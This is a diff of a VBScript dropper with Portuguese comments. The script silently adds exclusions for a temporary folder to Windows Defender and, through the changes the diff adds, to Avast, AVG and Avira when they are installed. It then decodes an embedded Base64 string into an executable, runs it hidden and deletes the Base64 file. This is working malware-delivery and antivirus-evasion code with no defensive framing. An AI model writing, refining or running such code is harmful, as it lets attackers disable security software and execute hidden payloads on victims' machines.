@@ -7,14 +7,23 @@ Set shell = CreateObject("WScript.Shell")
 ' Excluir do Windows Defender
 shell.Run "powershell -Command Add-MpPreference -ExclusionPath '" & tempPath & "'", 0, True
 
-' Excluir do Avast
-shell.Run """C:\Program Files\AVAST Software\Avast\ashCmd.exe"" --exclude """ & tempPath & """", 0, True
+' Verificar se o Avast está instalado e adicionar exclusão
+avastCmd = "C:\Program Files\AVAST Software\Avast\ashCmd.exe"
+If CreateObject("Scripting.FileSystemObject").FileExists(avastCmd) Then
+    shell.Run """" & avastCmd & """ --exclude """ & tempPath & """", 0, True
+End If
 
-' Excluir do AVG 
-shell.Run """C:\Program Files\AVG\Antivirus\avgcmd.exe"" --exclude """ & tempPath & """", 0, True
+' Verificar se o AVG está instalado e adicionar exclusão
+avgCmd = "C:\Program Files\AVG\Antivirus\avgcmd.exe"
+If CreateObject("Scripting.FileSystemObject").FileExists(avgCmd) Then
+    shell.Run """" & avgCmd & """ --exclude """ & tempPath & """", 0, True
+End If
 
-' Excluir do Avira 
-shell.Run """C:\Program Files\Avira\Antivirus\avira.exe"" --exclude """ & tempPath & """", 0, True
+' Verificar se o Avira está instalado e adicionar exclusão
+aviraCmd = "C:\Program Files\Avira\Antivirus\avira.exe"
+If CreateObject("Scripting.FileSystemObject").FileExists(aviraCmd) Then
+    shell.Run """" & aviraCmd & """ --exclude """ & tempPath & """", 0, True
+End If
 
 ' Criar arquivo temporário Base64
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -22,8 +31,11 @@ Set tempFile = fso.CreateTextFile(base64File, True)
 tempFile.Write base64String
 tempFile.Close
 
+' Criar o arquivo .exe a partir do Base64
 shell.Run "powershell -Command [System.IO.File]::WriteAllBytes('" & outputPath & "', [Convert]::FromBase64String((Get-Content -Path '" & base64File & "')))", 0, True
 
+' Executar o arquivo gerado
 shell.Run "powershell -Command Start-Process -FilePath '" & outputPath & "'", 0, False
 
+' Excluir o arquivo temporário Base64
 fso.DeleteFile base64File
